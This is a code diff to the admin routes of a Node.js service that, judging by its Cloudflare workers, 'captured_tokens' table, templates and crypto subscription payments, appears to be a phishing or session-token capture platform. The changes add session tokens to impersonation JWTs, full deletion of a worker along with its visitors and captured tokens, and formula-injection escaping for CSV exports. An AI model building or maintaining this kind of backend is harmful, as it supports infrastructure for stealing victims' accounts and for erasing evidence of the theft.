@@ -6,7 +6,7 @@ const db = require('../database/connection');
 const config = require('../config/env');
 const { adminAuth } = require('../middleware/auth');
 const { encrypt, decrypt } = require('../utils/encrypt');
-const { generateActivationCode } = require('../utils/helpers');
+const { generateActivationCode, generateSessionToken } = require('../utils/helpers');
 const axios = require('axios');
 
 // --- Middleware to check admin panel access ---
@@ -162,7 +162,8 @@ router.get('/users/:id/impersonate', adminAuth, async (req, res) => {
     const [users] = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
     if (!users.length) return res.status(404).json({ error: 'User not found' });
     
-    const token = jwt.sign({ user_id: users[0].id }, config.JWT_SECRET, { expiresIn: '1h' });
+    const sessionToken = generateSessionToken();
+    const token = jwt.sign({ user_id: users[0].id, session: sessionToken }, config.JWT_SECRET, { expiresIn: '1h' });
     await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
       [req.admin.id, 'impersonate', `User ID: ${req.params.id}`, req.ip]);
     res.json({ token, user: { id: users[0].id, subscription_status: users[0].subscription_status } });
@@ -299,8 +300,38 @@ router.get('/workers/:id/logs', adminAuth, async (req, res) => {
 });
 
 router.delete('/workers/:id', adminAuth, async (req, res) => {
-  await db.query("UPDATE links SET status = 'disabled' WHERE id = ?", [req.params.id]);
-  res.json({ success: true });
+  try {
+    // Get link and user details
+    const [links] = await db.query('SELECT l.*, u.cf_api_token, u.cf_account_id FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?', [req.params.id]);
+    if (!links.length) return res.status(404).json({ error: 'Worker not found' });
+
+    const link = links[0];
+
+    // Delete Cloudflare worker if it exists
+    if (link.worker_name && link.cf_api_token && link.cf_account_id) {
+      try {
+        const axios = require('axios');
+        await axios.delete(
+          `https://api.cloudflare.com/client/v4/accounts/${link.cf_account_id}/workers/scripts/${link.worker_name}`,
+          { headers: { Authorization: `Bearer ${link.cf_api_token}` }, timeout: 15000 }
+        );
+        console.log(`[Admin] Deleted Cloudflare worker: ${link.worker_name}`);
+      } catch (cfErr) {
+        console.error('[Admin] Cloudflare deletion failed:', cfErr.message);
+        // Continue anyway
+      }
+    }
+
+    // Delete associated data
+    await db.query('DELETE FROM visitors WHERE link_id = ?', [link.id]);
+    await db.query('DELETE FROM captured_tokens WHERE link_id = ?', [link.id]);
+    await db.query('DELETE FROM links WHERE id = ?', [link.id]);
+
+    res.json({ success: true, message: 'Worker and all associated data deleted' });
+  } catch (err) {
+    console.error('[Admin] Worker deletion error:', err);
+    res.status(500).json({ error: 'Server error' });
+  }
 });
 
 // --- Templates management (admin) ---
@@ -412,12 +443,21 @@ router.get('/analytics', adminAuth, async (req, res) => {
 });
 
 // --- Export ---
+// CSV-safe string: escapes values starting with =, +, -, @, or tab to prevent formula injection
+function csvEscape(val) {
+  const str = String(val ?? '');
+  if (/^[=+\-@\t]/.test(str) || str.includes(',') || str.includes('"') || str.includes('\n')) {
+    return '"' + str.replace(/"/g, '""') + '"';
+  }
+  return str;
+}
+
 router.get('/export/users', adminAuth, async (req, res) => {
   const [users] = await db.query('SELECT id, login_key, subscription_status, subscription_plan, subscription_expiry, created_at FROM users');
   res.setHeader('Content-Type', 'text/csv');
   res.setHeader('Content-Disposition', 'attachment; filename=users_export.csv');
   let csv = 'ID,Login Key,Status,Plan,Expiry,Created\n';
-  users.forEach(u => { csv += `${u.id},${u.login_key},${u.subscription_status},${u.subscription_plan},${u.subscription_expiry || ''},${u.created_at}\n`; });
+  users.forEach(u => { csv += `${csvEscape(u.id)},${csvEscape(u.login_key)},${csvEscape(u.subscription_status)},${csvEscape(u.subscription_plan)},${csvEscape(u.subscription_expiry || '')},${csvEscape(u.created_at)}\n`; });
   res.send(csv);
 });
 
@@ -426,7 +466,7 @@ router.get('/export/payments', adminAuth, async (req, res) => {
   res.setHeader('Content-Type', 'text/csv');
   res.setHeader('Content-Disposition', 'attachment; filename=payments_export.csv');
   let csv = 'ID,UID,Coin,Amount USD,Status,Created,Confirmed\n';
-  payments.forEach(p => { csv += `${p.id},${p.payment_uid},${p.coin},${p.amount_usd},${p.status},${p.created_at},${p.confirmed_at || ''}\n`; });
+  payments.forEach(p => { csv += `${csvEscape(p.id)},${csvEscape(p.payment_uid)},${csvEscape(p.coin)},${csvEscape(p.amount_usd)},${csvEscape(p.status)},${csvEscape(p.created_at)},${csvEscape(p.confirmed_at || '')}\n`; });
   res.send(csv);
 });
 
